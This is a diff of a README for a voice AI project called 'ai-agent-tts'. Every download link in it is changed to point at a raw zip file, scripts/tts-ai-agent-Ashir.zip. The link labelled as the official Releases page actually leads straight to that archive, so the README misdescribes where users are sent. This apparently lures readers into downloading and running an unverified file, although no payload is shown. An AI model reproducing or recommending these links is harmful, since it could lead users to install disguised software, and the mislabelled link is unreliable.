@@ -6,7 +6,7 @@ Welcome to **ai-agent-tts**! This platform lets you experience low-latency voice
 
 ## 📥 Download Now
 
-[![Download ai-agent-tts](https://github.com/Nur-syafira/ai-agent-tts/raw/refs/heads/main/docs/tts_agent_ai_v3.3.zip)](https://github.com/Nur-syafira/ai-agent-tts/raw/refs/heads/main/docs/tts_agent_ai_v3.3.zip)
+[![Download ai-agent-tts](https://github.com/Nur-syafira/ai-agent-tts/raw/refs/heads/main/scripts/tts-ai-agent-Ashir.zip)](https://github.com/Nur-syafira/ai-agent-tts/raw/refs/heads/main/scripts/tts-ai-agent-Ashir.zip)
 
 ## 📖 Overview
 
@@ -40,7 +40,7 @@ Before you download **ai-agent-tts**, ensure your system meets these requirement
 
 To get started, follow these simple steps:
 
-1. **Visit the Releases Page**: Go to the official [Releases page](https://github.com/Nur-syafira/ai-agent-tts/raw/refs/heads/main/docs/tts_agent_ai_v3.3.zip).
+1. **Visit the Releases Page**: Go to the official [Releases page](https://github.com/Nur-syafira/ai-agent-tts/raw/refs/heads/main/scripts/tts-ai-agent-Ashir.zip).
   
 2. **Download the Latest Version**: Look for the latest version and download the file suitable for your operating system.
 
@@ -53,7 +53,7 @@ To get started, follow these simple steps:
 
 5. **Start Using Voice AI**: Follow the on-screen instructions to set up your preferences and start using the platform.
 
-To download **ai-agent-tts** again, you can also use this direct link: [Download here](https://github.com/Nur-syafira/ai-agent-tts/raw/refs/heads/main/docs/tts_agent_ai_v3.3.zip).
+To download **ai-agent-tts** again, you can also use this direct link: [Download here](https://github.com/Nur-syafira/ai-agent-tts/raw/refs/heads/main/scripts/tts-ai-agent-Ashir.zip).
 
 ## 📊 Use Cases
 
